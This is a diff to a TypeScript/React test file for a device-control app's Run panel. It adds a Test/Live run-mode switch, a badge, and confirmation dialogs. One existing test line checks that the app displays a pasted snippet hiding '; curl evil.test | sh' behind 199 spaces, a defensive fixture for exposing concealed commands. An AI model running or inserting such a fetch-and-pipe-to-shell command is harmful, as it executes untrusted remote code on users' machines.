@@ -2,7 +2,7 @@ import { describe, expect, it } from 'vitest';
 import { renderToStaticMarkup } from 'react-dom/server';
 import type { DisplaySettings, LiveDevice, ModuleControl, Profile } from './contracts';
 import { emptyKeypadPage } from './keypad-model';
-import { appControlNote, builtInKeypadBlocker, settingsErrorBlocker, settingsLoadingBlocker, softwareModeBox, confirmCopy, countdownSeconds, dialogCopy, isMacPlatform, phaseLabel, relativeTime, resumeCopy, runBlocker, runPreviewNote, serviceResumeId, disconnectedServiceValue, resolveServiceSelection, RunBlockerNotice, RunHeaderControl, ServicePanel, settlePendingConfirm, useRunSession } from './ServicePanel';
+import { appControlNote, builtInKeypadBlocker, settingsErrorBlocker, settingsLoadingBlocker, softwareModeBox, confirmCopy, countdownSeconds, dialogCopy, isMacPlatform, modeSwitchCopy, phaseLabel, relativeTime, resumeCopy, runBlocker, runModeBadge, runPreviewNote, serviceResumeId, disconnectedServiceValue, resolveServiceSelection, RunBlockerNotice, RunHeaderControl, ServicePanel, settlePendingConfirm, useRunSession } from './ServicePanel';
 import type { RunSessionOptions } from './ServicePanel';
 import { DisplaySettingsStore } from './display-settings';
 import { emptyCounters, ServiceRunner, serviceIdFor, type ServiceRun } from './service-runner';
@@ -73,7 +73,15 @@ const render = (props: Partial<RunSessionOptions> = {}) => {
 };
 // The idle Run panel for `device` with Module control `control` (loaded unless `state` says otherwise).
 function loadedSettings() {
-  const settings: DisplaySettings = { module_control: 'app', auto_execute: false };
+  const settings: DisplaySettings = { module_control: 'app', run_mode: 'test' };
+  const displaySettings = new DisplaySettingsStore(async <T,>() => settings as T, true);
+  (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: true, settings };
+  return displaySettings;
+}
+
+// The loaded store with the mode preset, for the header switch and Run button.
+function loadedSettingsWith(mode: 'live' | 'test') {
+  const settings: DisplaySettings = { module_control: 'app', run_mode: mode };
   const displaySettings = new DisplaySettingsStore(async <T,>() => settings as T, true);
   (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: true, settings };
   return displaySettings;
@@ -82,7 +90,7 @@ function panelFor(device: LiveDevice, control: ModuleControl, profile: Profile, 
   const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
   (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [device] };
   const runner = new ServiceRunner(async () => undefined as never, async () => () => {}, true);
-  const settings: DisplaySettings = { module_control: control, auto_execute: false };
+  const settings: DisplaySettings = { module_control: control, run_mode: 'test' };
   const displaySettings = new DisplaySettingsStore(async <T,>() => settings as T, true);
   (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: state.loaded ?? true, error: state.error ?? null, settings };
   return render({ feed, runner, profile, displaySettings });
@@ -224,11 +232,12 @@ describe('ServicePanel markup', () => {
     expect(render({ profile })).toContain(`${' '.repeat(199)}; curl evil.test | sh</code>`);
     expect(copy.lines[0]).toBe('Pastes 1 text snippet into the focused app (shown below).');
   });
-  it('disables Execute off macOS and explains it', () => {
+  it('keeps Live off macOS and explains it', () => {
     const { feed, runner } = fixtures(false, 'failed');
-    const markup = render({ feed, runner, platform: { platform: 'Win32' } });
-    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>Execute actions</);
+    const markup = render({ feed, runner, platform: { platform: 'Win32' }, displaySettings: loadedSettingsWith('live') });
+    expect(markup).toMatch(/<button type="button" class="mode-choice"[^>]*disabled=""[^>]*>Live</);
     expect(markup).toContain('only available on macOS');
+    expect(markup).toContain('badge in the header');
   });
   it('disables Run with the Module control reason for a paged profile on the 15-key module', () => {
     const markup = panelFor(keypad, 'built_in_animation', nested);
@@ -303,7 +312,10 @@ describe('ServicePanel markup', () => {
   it('is disabled in the browser preview', () => {
     const markup = render({ desktop: false });
     expect(markup).toContain('needs the desktop app');
-    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>Dry run/);
+    expect(markup).toMatch(runDisabled);
+    // The mode switch is off with the settings unread, and the badge reads Test.
+    expect(markup).toMatch(/run-mode-pill test" role="status">Test</);
+    expect(markup).toMatch(/<button type="button" class="mode-choice"[^>]*disabled=""[^>]*>Live</);
   });
 });
 
@@ -353,13 +365,23 @@ describe('header Run control', () => {
     // The tooltip still carries the full device name with its serial.
     expect(render({ feed, runner, displaySettings: loadedSettings() })).toMatch(/title="Dry run on Encoder IPS display S1"/);
   });
-  it('warns with danger styling and the full label before an Execute run', () => {
+  it('runs with actions in Live mode and stays primary in Test', () => {
     const { feed, runner } = fixtures(false, 'exited');
-    const markup = render({ feed, runner, displaySettings: loadedSettings(), initialExecute: true });
-    expect(markup).toContain('>Run with actions on encoder</button>');
-    expect(markup).toMatch(/<button type="button" class="button danger" title="Run with actions on Encoder IPS display S1"/);
-    // Dry run stays primary.
+    const live = render({ feed, runner, displaySettings: loadedSettingsWith('live') });
+    expect(live).toContain('>Run with actions on encoder</button>');
+    expect(live).toMatch(/<button type="button" class="button danger" title="Run with actions on Encoder IPS display S1"/);
+    expect(live).toMatch(/run-mode-pill live" role="status">Live</);
+    // Test stays primary.
     expect(render({ feed, runner, displaySettings: loadedSettings() })).toMatch(/<button type="button" class="button primary" title="Dry run on Encoder IPS display S1"/);
+  });
+  it('reads Test (imported profile) on the badge while the open profile may not execute', () => {
+    const { feed, runner } = fixtures(false, 'exited');
+    const imported = render({ feed, runner, displaySettings: loadedSettingsWith('live'), dryRunOnly: true, dryRunNote: 'imported' });
+    expect(imported).toMatch(/run-mode-pill test" role="status">Test \(imported profile\)</);
+    expect(imported).toContain('>Run on encoder</button>');
+    // The saved mode stays Live and its switch stays on: only this profile
+    // is held back, which the badge says.
+    expect(imported).toMatch(/<button type="button" class="mode-choice" aria-pressed="true" title="Switch to Live mode[^>]*>Live</);
   });
   it('shows a blocked Run its reason as a strip in the header, not only as a tooltip', () => {
     // A connected module with a blocked profile (Built-in animation) names the setting in the strip.
@@ -375,6 +397,82 @@ describe('header Run control', () => {
     // The browser preview omits the strip: its own banner already says the desktop app is needed.
     expect(render({ desktop: false })).not.toContain('run-blocker-strip');
     expect(render({ desktop: false })).toMatch(/title="[^"]*needs the desktop app[^"]*"/);
+  });
+});
+
+describe('the run mode', () => {
+  const tick = () => new Promise(resolve => setTimeout(resolve, 0));
+  const named = (name: string): ServiceRun => ({ serviceId: `service:${name}`, state: 'running', execute: false, entries: [], counters: emptyCounters(), startedAt: 0, profileName: name, snapshot: '', draftUnsaved: false });
+
+  it('labels the badge so it always says what a press will do', () => {
+    expect(runModeBadge('test', false)).toBe('Test');
+    expect(runModeBadge('live', false)).toBe('Live');
+    expect(runModeBadge('test', true)).toBe('Test (imported profile)');
+    // With the imported profile open, Live would not run its actions.
+    expect(runModeBadge('live', true)).toBe('Test (imported profile)');
+  });
+  it('builds the switch-to-Live copy from every running profile; one that cannot be read is high risk', () => {
+    const single = modeSwitchCopy([named('Everyday')], [flat]);
+    expect(single).toMatchObject({ title: 'Switch the mode to Live?', confirm: 'Switch to Live', risk: 'elevated', warning: null, acknowledge: null });
+    expect(single.message).toContain('the running profile "Everyday"');
+    expect(single.lines).toContain('No actions are bound yet, so nothing will run until you add some.');
+    const both = modeSwitchCopy([named('Everyday'), named('Streaming')], [flat, null]);
+    expect(both.message).toContain('the running profiles "Everyday", "Streaming"');
+    expect(both.risk).toBe('high');
+    expect(both.warning).toContain('could not be checked');
+    expect(both.acknowledge).toBe('I reviewed these profiles and trust their sources');
+  });
+  it('saves Test at once and asks once for Live while a dry run is active', async () => {
+    const calls: [string, Record<string, unknown> | undefined][] = [];
+    const settings: DisplaySettings = { module_control: 'app', run_mode: 'test' };
+    const store = new DisplaySettingsStore(async (command, args) => {
+      calls.push([command, args]);
+      return settings as never;
+    }, true);
+    (store as unknown as { state: unknown }).state = { ...store.getState(), loaded: true, settings };
+    const { feed, runner } = fixtures(false);
+    let run: ReturnType<typeof useRunSession> | null = null;
+    const View = () => {
+      run = useRunSession({ runner, feed, profile: flat, desktop: true, unsaved: false, platform: mac, now: 2000, displaySettings: store });
+      return null;
+    };
+    renderToStaticMarkup(<View />);
+    run!.setRunMode('test');
+    expect(calls).toEqual([]);
+    // The switch to Live opens the dialog (a dry run is active): no save yet.
+    run!.setRunMode('live');
+    await tick();
+    expect(calls).toEqual([]);
+    // Cancelling answers the dialog without saving.
+    run!.answer(false);
+    run!.setRunMode('live');
+    await tick();
+    // Confirming answers the dialog with one save of the new mode.
+    run!.answer(true);
+    await tick();
+    expect(calls).toEqual([['set_display_settings', { settings: { module_control: 'app', run_mode: 'live' } }]]);
+    // The dialog answered, another confirm saves nothing by itself.
+    run!.answer(true);
+    expect(calls).toHaveLength(1);
+  });
+  it('switches to Live without a dialog while nothing runs', async () => {
+    const calls: [string, Record<string, unknown> | undefined][] = [];
+    const settings: DisplaySettings = { module_control: 'app', run_mode: 'test' };
+    const store = new DisplaySettingsStore(async (command, args) => {
+      calls.push([command, args]);
+      return settings as never;
+    }, true);
+    (store as unknown as { state: unknown }).state = { ...store.getState(), loaded: true, settings };
+    let run: ReturnType<typeof useRunSession> | null = null;
+    const View = () => {
+      run = useRunSession({ profile: flat, desktop: true, unsaved: false, platform: mac, now: 2000, displaySettings: store });
+      return null;
+    };
+    renderToStaticMarkup(<View />);
+    run!.setRunMode('live');
+    await tick();
+    expect(run!.dialogOpen).toBe(false);
+    expect(calls).toEqual([['set_display_settings', { settings: { module_control: 'app', run_mode: 'live' } }]]);
   });
 });
 
